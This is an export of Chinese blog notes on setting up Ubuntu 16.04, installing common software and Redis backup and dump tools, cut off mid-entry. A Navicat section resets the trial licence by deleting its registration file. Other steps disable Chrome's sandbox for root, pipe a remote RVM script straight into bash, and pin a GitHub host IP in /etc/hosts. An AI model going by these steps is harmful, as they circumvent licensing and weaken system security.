class="meta prompt_"># </span><span class="language-bash">根据依赖关系更新</span></span><br><span class="line">sudo apt-get dist-upgrade</span><br></pre></td></tr></table></figure><h3 id="八、windows和ubuntun双系统时间不对的问题"><a href="#八、windows和ubuntun双系统时间不对的问题" class="headerlink" title="八、windows和ubuntun双系统时间不对的问题"></a>八、windows和ubuntun双系统时间不对的问题</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">校准时间</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ntpdate</span><br><span class="line">sudo ntpdate time.windows.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后将时间更新到硬件上：</span></span><br><span class="line">sudo hwclock --localtime --systohc</span><br></pre></td></tr></table></figure><p>重新进入windows10，发现时间恢复正常了！</p><h3 id="九、移动Ubuntu16-04桌面左侧的启动器到屏幕底部"><a href="#九、移动Ubuntu16-04桌面左侧的启动器到屏幕底部" class="headerlink" title="九、移动Ubuntu16.04桌面左侧的启动器到屏幕底部"></a>九、移动Ubuntu16.04桌面左侧的启动器到屏幕底部</h3><p>1.底</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gsettings set com.canonical.Unity.Launcher launcher-position Bottom</span><br></pre></td></tr></table></figure><p>2.左</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gsettings set com.canonical.Unity.Launcher launcher-position Left</span><br></pre></td></tr></table></figure><h3 id="十、设置root用户登录图形界面"><a href="#十、设置root用户登录图形界面" class="headerlink" title="十、设置root用户登录图形界面"></a>十、设置root用户登录图形界面</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑配置文件</span></span><br><span class="line">sudo gedit /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加一行，增加登陆选项</span></span><br><span class="line">greeter-show-manual-login=true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加一行，禁用客人会话</span></span><br><span class="line">allow-guest=false</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给root设置密码</span></span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p>root用户在登录会有错误,读取&#x2F;root&#x2F;.profile时发生错误：mesg:tty n</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gedit /root/.profile</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到mesg n，替换成</span></span><br><span class="line">tty -s &amp;&amp; mesg n || true</span><br></pre></td></tr></table></figure><h3 id="十一、快捷键和启动器无法打开终端"><a href="#十一、快捷键和启动器无法打开终端" class="headerlink" title="十一、快捷键和启动器无法打开终端"></a>十一、快捷键和启动器无法打开终端</h3><p>可能是装Python时遗留下来的问题，把指向原Python3.5的文件指向python3.6</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入路径</span></span><br><span class="line">cd  /usr/lib/python3/dist-packages/gi/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重命名两个文件</span></span><br><span class="line">sudo mv _gi_cairo.cpython-35m-x86_64-linux-gnu.so _gi_cairo.cpython-36m-x86_64-linux-gnu.so</span><br><span class="line">sudo mv _gi.cpython-35m-x86_64-linux-gnu.so _gi.cpython-36m-x86_64-linux-gnu.so</span><br></pre></td></tr></table></figure><p>再打开终端就正常了</p><h3 id="十二、删除不常用的软件"><a href="#十二、删除不常用的软件" class="headerlink" title="十二、删除不常用的软件"></a>十二、删除不常用的软件</h3><p>1.firefox</p><ul><li>查找firefox具体内容</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg --get-selections |grep firefox</span><br></pre></td></tr></table></figure><ul><li>卸载软件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge firefox firefox-locale-en unity-scope-firefoxbookmarks</span><br></pre></td></tr></table></figure><p>2.不常用软件包清单</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">libreoffice</span></span><br><span class="line">sudo apt-get remove --purge libreoffice*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Amazon链接</span></span><br><span class="line">sudo apt-get remove --purge unity-webapps-common*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">雷鸟邮件客户端</span></span><br><span class="line">sudo apt-get remove --purge thunderbird*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自带的播放器</span></span><br><span class="line">sudo apt-get remove --purge totem*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自带播放器</span></span><br><span class="line">sudo apt-get remove --purge vlc*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自带的音乐播放器</span></span><br><span class="line">sudo apt-get remove --purge rhythmbox*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自带的即时聊天应用</span></span><br><span class="line">sudo apt-get remove --purge empathy*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自带的光盘刻录器</span></span><br><span class="line">sudo apt-get remove --purge brasero*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描仪</span></span><br><span class="line">sudo apt-get remove --purge simple-scan*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对对碰游戏</span></span><br><span class="line">sudo apt-get remove --purge gnome-mahjongg*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">纸牌游戏</span></span><br><span class="line">sudo apt-get remove --purge aisleriot*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫雷游戏</span></span><br><span class="line">sudo apt-get remove --purge gnome-mines*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数独游戏</span></span><br><span class="line">sudo apt-get remove --purge gnome-sudoku*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">BT客户端</span></span><br><span class="line">sudo apt-get remove --purge transmission-common*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">屏幕阅读</span></span><br><span class="line">sudo apt-get remove --purge gnome-orca*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份</span></span><br><span class="line">sudo apt-get remove --purge deja-dup*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">屏幕键盘</span></span><br><span class="line">sudo apt-get remove --purge onboard*</span><br></pre></td></tr></table></figure><p>3.自动卸载无用依赖</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove</span><br></pre></td></tr></table></figure><h3 id="十三、Ubuntu16-04简易美化教程"><a href="#十三、Ubuntu16-04简易美化教程" class="headerlink" title="十三、Ubuntu16.04简易美化教程"></a>十三、Ubuntu16.04简易美化教程</h3><ul><li>安装unity-tweak-tool</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install unity-tweak-tool</span><br></pre></td></tr></table></figure><ul><li>安装主题、图标、鼠标指针、字体</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac主题、图标、鼠标指针：</span></span><br><span class="line">sudo add-apt-repository ppa:noobslab/macbuntu</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install macbuntu-os-icons-lts-v7</span><br><span class="line">sudo apt-get install macbuntu-os-ithemes-lts-v7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac字体：</span></span><br><span class="line">sudo mkdir /usr/share/fonts/apple</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将下载好的Mac字体压缩包解压到</span></span><br><span class="line">/usr/share/fonts/apple</span><br></pre></td></tr></table></figure><ul><li>设置unity-tweak-tool</li></ul><p>打开unity-tweak-tool</p><p>选择下载的主题、图标、鼠标指针、字体</p><ul><li>终端的外观设置</li></ul><p>在终端界面下右键选择配置文件首选项</p><p>勾选上“使用透明背景”将其透明度稍微拉到10%左右</p><p>将“内置方案”改成“Tango”</p><ul><li>cairo-dock</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">sudo apt-get install cairo-dock</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">cairo-dock</span><br></pre></td></tr></table></figure><p>在dash菜单中搜索“启动应用程序”并打开</p><p>点击添加</p><p>填入添加信息：“cairo-dock”</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">名称（N）：cairo-dock</span><br><span class="line">命令（M）：cairo-dock</span><br><span class="line">注释（E）：cairo-dock</span><br></pre></td></tr></table></figure><ul><li>打开unity-tweak-tool失败</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install unity-control-center</span><br></pre></td></tr></table></figure><h3 id="十四、解决挂载失败问题"><a href="#十四、解决挂载失败问题" class="headerlink" title="十四、解决挂载失败问题"></a>十四、解决挂载失败问题</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入root模式</span></span><br><span class="line"></span><br><span class="line">sudo su</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换路径</span></span><br><span class="line">cd /media/root</span><br><span class="line">mkdir OS_tmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">建立一个临时挂载文件夹，nvme0n1p2为挂载失败盘</span></span><br><span class="line">mount -o ro /dev/nvme0n1p2 /media/root/OS_tmp</span><br></pre></td></tr></table></figure><h3 id="十五、root用户登录没有声音"><a href="#十五、root用户登录没有声音" class="headerlink" title="十五、root用户登录没有声音"></a>十五、root用户登录没有声音</h3><ol><li>在dash菜单中搜索“启动应用程序”并打开</li><li>点击添加</li><li>填入添加信息：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">名称（N）：声音</span><br><span class="line">命令（M）：pulseaudio --start --log-target=syslog</span><br><span class="line">注释（E）：声音</span><br></pre></td></tr></table></figure><h3 id="十六、设置中心打不开"><a href="#十六、设置中心打不开" class="headerlink" title="十六、设置中心打不开"></a>十六、设置中心打不开</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install unity-control-center</span><br></pre></td></tr></table></figure><h3 id="十七、小键盘开机自启"><a href="#十七、小键盘开机自启" class="headerlink" title="十七、小键盘开机自启"></a>十七、小键盘开机自启</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装一个小软件</span></span><br><span class="line">sudo apt-get install numlockx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑配置文件</span></span><br><span class="line">sudo gedit /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在最后添加：</span></span><br><span class="line">greeter-setup-script=/usr/bin/numlockx on</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启或者注销。启动时，小键盘自动打开。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No29：Ubuntu16的常用软件安装</title>
      <link href="/posts/bd6aa3bb.html"/>
      <url>/posts/bd6aa3bb.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、Google-Chrome"><a href="#一、Google-Chrome" class="headerlink" title="一、Google Chrome"></a>一、Google Chrome</h3><h4 id="1、官网下载deb格式直接安装"><a href="#1、官网下载deb格式直接安装" class="headerlink" title="1、官网下载deb格式直接安装"></a>1、官网下载deb格式直接安装</h4><h4 id="2、解决root不能打开的问题"><a href="#2、解决root不能打开的问题" class="headerlink" title="2、解决root不能打开的问题"></a>2、解决root不能打开的问题</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到软件路径</span></span><br><span class="line">whereis google-chrome</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置文件</span></span><br><span class="line">sudo vim /usr/bin/google-chrome</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exec</span> -a <span class="string">&quot;<span class="variable">$0</span>&quot;</span> <span class="string">&quot;<span class="variable">$HERE</span>/chrome&quot;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">改为</span></span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot; --user-data-dir --no-sandbox</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">右键快捷方式，点击属性，在命令后添加</span></span><br><span class="line">--no-sandbox</span><br></pre></td></tr></table></figure><h3 id="二、Pycharm"><a href="#二、Pycharm" class="headerlink" title="二、Pycharm"></a>二、Pycharm</h3><ul><li><p>先在<a href="https://www.jetbrains.com/pycharm/download/#section=linux">PyCharm官网</a>下载安装包</p></li><li><p>右键提取到文件夹，提取完成后，会生成一个pycharm的文件夹</p></li><li><p>在终端指定到pycharm &#x2F;bin目录下，执行sh命令，打开安装</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sh ./pycharm.sh</span><br></pre></td></tr></table></figure><ul><li>如果报JDK的环境错误，先配置PyCharm的JDK环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加，更新，安装</span></span><br><span class="line">sudo add-apt-repository ppa:webupd8team/java</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install oracle-java8-installer</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置Java_home环境</span></span><br><span class="line">sudo apt-get install oracle-java8-set-default</span><br><span class="line">echo JAVA_HOME=&quot;/usr/lib/jvm/java-8-oracle&quot; &gt;&gt; /etc/environment</span><br><span class="line">source /etc/environment</span><br></pre></td></tr></table></figure><h3 id="三、VIM"><a href="#三、VIM" class="headerlink" title="三、VIM"></a>三、VIM</h3><ul><li>安装VIM</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><ul><li>VIM主题scheme设置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim .vimrc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在vimrc文件里添加如下信息即可设置主题</span></span><br><span class="line">colorscheme 主题插件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如</span></span><br><span class="line">colorscheme desert</span><br></pre></td></tr></table></figure><p>在&#x2F;usr&#x2F;share&#x2F;vim&#x2F;vim80&#x2F;color文件夹里，vim已经自带了十几种主题插件，选择一种即可：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">blue.vim      desert.vim    koehler.vim  peachpuff.vim  slate.vim</span><br><span class="line">darkblue.vim  elflord.vim   morning.vim  README.txt     torte.vim</span><br><span class="line">default.vim   evening.vim   murphy.vim   ron.vim        zellner.vim</span><br><span class="line">delek.vim     industry.vim  pablo.vim    shine.vim</span><br></pre></td></tr></table></figure><h3 id="四、Wine"><a href="#四、Wine" class="headerlink" title="四、Wine"></a>四、Wine</h3><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载秘钥</span></span><br><span class="line">wget -nc https://dl.winehq.org/wine-builds/Release.key</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入秘钥:</span></span><br><span class="line">sudo apt-key add Release.key</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加仓储</span></span><br><span class="line">sudo apt-add-repository https://dl.winehq.org/wine-builds/ubuntu/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加公钥</span></span><br><span class="line">sudo apt-key adv --recv-keys --keyserver keyserver.Ubuntu.com F987672F</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新程序包</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装wine稳定版</span></span><br><span class="line">sudo apt-get install --install-recommends winehq-stable</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wine程序安装在/opt目录，工作目录在~/.wine</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装winetricks</span></span><br><span class="line">wget https://raw.githubusercontent.com/Winetricks/winetricks/master/src/winetricks</span><br></pre></td></tr></table></figure><ul><li>常用的命令</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">wine xx.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wine的设置</span></span><br><span class="line">winecfg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wine系统配置</span></span><br><span class="line">winetricks</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任务管理器</span></span><br><span class="line">wine taskmgr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载软件</span></span><br><span class="line">wine uninstaller</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注册表</span></span><br><span class="line">wine regedit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记事本</span></span><br><span class="line">wine notepad</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启wine</span></span><br><span class="line">wineboot</span><br></pre></td></tr></table></figure><h3 id="五、Deepin-Wine"><a href="#五、Deepin-Wine" class="headerlink" title="五、Deepin-Wine"></a>五、Deepin-Wine</h3><ul><li>下载deepin-wine环境</li></ul><p><a href="https://github.com/wszqkzqk/deepin-wine-for-ubuntu">下载地址</a>，下载zip包，解压到本地文件夹，在文件夹中打开终端。</p><ul><li>安装deepin-wine环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装deepin-wine环境</span></span><br><span class="line">sudo sh ./install.sh</span><br></pre></td></tr></table></figure><ul><li>安装应用容器</li></ul><p><a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/">下载地址</a>，下载容器。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用dpkg命令安装</span></span><br><span class="line">sudo dpkg -i deb文件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据经验，通常情况下会报依赖关系的错误，我们可以使用以下的命令修复安装：</span></span><br><span class="line">sudo apt-get install -f</span><br></pre></td></tr></table></figure><ul><li>举例</li></ul><p>TIM、WeChat、7-ZIP</p><h3 id="六、SMPlayer"><a href="#六、SMPlayer" class="headerlink" title="六、SMPlayer"></a>六、SMPlayer</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加源仓库</span></span><br><span class="line">sudo add-apt-repository ppa:rvm/smplayer</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先更新，再安装</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install smplayer smplayer-themes smplayer-skins</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">intel的CPU32位解码器</span></span><br><span class="line">sudo apt-get install w32codecs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">intel的CPU64位解码器</span></span><br><span class="line">sudo apt-get install w64codecs</span><br></pre></td></tr></table></figure><h3 id="七、Navicat-Premium"><a href="#七、Navicat-Premium" class="headerlink" title="七、Navicat Premium"></a>七、Navicat Premium</h3><ul><li>下载</li></ul><p><a href="https://www.navicat.com.cn/download/navicat-premium">下载地址</a></p><ul><li><p>解压tar文件</p></li><li><p>解压后，进入解压后的目录运行命令：</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./start_navicat</span><br></pre></td></tr></table></figure><ul><li>安装后问题：</li></ul><p>界面乱码</p><ol><li><p>打开乱码的界面，选择菜单栏第五个（如果Navicat版本不同的话，注意是乱码后括号里为T的那个，表示工具Tool），下拉菜单中选择最后一个，打开为选项。</p></li><li><p>选项里左边选择第一个，在右边第一个下拉框中选择Noto Sans mono CJK SC Regular，编辑器选项和记录选项也都选择这个字体。</p></li><li><p>确定保存时要注意，如果你用的虚拟机可能因为界面太小，只能显示到“默认”按钮，实际上下面还有“确定”和“取消”两个按钮显示不出来，千万不要点成默认按钮，否则又还原成默认的字体了。</p></li><li><p>如果没显示出来确定按钮，用tab键慢慢切换到默认按钮的下一个按钮按回车就保存好了。</p></li></ol><p>连接上数据库后中文数据是乱码，把Ubuntu的字符集修改为zh_CN.utf8。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看系统支持的字符集</span></span><br><span class="line">locale -a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改字符集:</span></span><br><span class="line">export LANG=zh_CN.utf8</span><br></pre></td></tr></table></figure><ul><li>破解方案</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一次执行start_navicat时，会在用户主目录下生成一个名为.navicat的隐藏文件夹</span></span><br><span class="line">cd /root/.navicat64/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此文件夹下有一个system.reg文件，把此文件删除</span></span><br><span class="line">sudo rm system.reg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下次启动navicat 会重新生成此文件，30天试用期会按新的时间开始计算</span></span><br></pre></td></tr></table></figure><h3 id="八、Kazam"><a href="#八、Kazam" class="headerlink" title="八、Kazam"></a>八、Kazam</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">录屏软件</span></span><br><span class="line">sudo apt-get install kazam</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">摄像头软件</span></span><br><span class="line">sudo apt-get install cheese</span><br></pre></td></tr></table></figure><h3 id="九、Nodejs-Cnpm"><a href="#九、Nodejs-Cnpm" class="headerlink" title="九、Nodejs+Cnpm"></a>九、Nodejs+Cnpm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先用普通的apt工具安装低版本的node，然后再升级最新</span></span><br><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install nodejs-legacy</span><br><span class="line">sudo apt-get install npm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更换淘宝的镜像</span></span><br><span class="line">sudo npm config set registry https://registry.npm.taobao.org</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看下配置是否生效</span></span><br><span class="line">sudo npm config list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装更新版本的工具N</span></span><br><span class="line">sudo npm install n -g</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新node版本</span></span><br><span class="line">sudo n stable</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装cnpm</span></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="十、WPS"><a href="#十、WPS" class="headerlink" title="十、WPS"></a>十、WPS</h3><ul><li><p>官网下载deb格式直接双击安装</p></li><li><p>解决打开WPS时出现的系统缺失字体问题</p></li></ul><p>下载字体包，解压后，将目录中所有文件复制到&#x2F;usr&#x2F;share&#x2F;fonts下，重新打开WPS，问题解决。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No28：Redis数据备份与恢复</title>
      <link href="/posts/4c302bb7.html"/>
      <url>/posts/4c302bb7.html</url>
      
        <content type="html"><![CDATA[<ul><li>备份</li></ul><p>Redis SAVE命令用于创建当前数据库的备份，该命令将在redis安装目录中创建dump.rdb文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; SAVE</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>创建redis备份文件也可以使用命令BGSAVE，该命令在后台执行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; BGSAVE</span><br><span class="line">Background saving started</span><br></pre></td></tr></table></figure><ul><li>恢复</li></ul><p>如果需要恢复数据，只需将备份文件(dump.rdb)移动到redis安装目录并启动服务即可。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取redis目录可以使用CONFIG命令</span></span><br><span class="line">redis 127.0.0.1:6379&gt; CONFIG GET dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/usr/local/redis/bin&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出的redis安装目录为/usr/local/redis/bin</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No27：Redis数据导出与导入</title>
      <link href="/posts/4938b265.html"/>
      <url>/posts/4938b265.html</url>
      
        <content type="html"><![CDATA[<ul><li>安装redis-dump</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装Ruby环境</span></span><br><span class="line">yum -y install ruby ruby-devel install rubygems</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更改gem源</span></span><br><span class="line">gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看现有源</span></span><br><span class="line">gem sources -l</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装curl</span></span><br><span class="line">yum install -y curl</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加RVM官网地址</span></span><br><span class="line">vim /etc/hosts</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加</span></span><br><span class="line">199.232.28.133 raw.githubusercontent.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入公钥</span></span><br><span class="line">gpg2 --keyserver hkp://pool.sks-keyservers.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装RVM</span></span><br><span class="line">curl -L get.rvm.io | bash -s stable</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加环境变量</span></span><br><span class="line">source /usr/local/rvm/scripts/rvm</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看rvm库中已知的ruby版本</span></span><br><span class="line">rvm list known</span><br><span class="line"><span 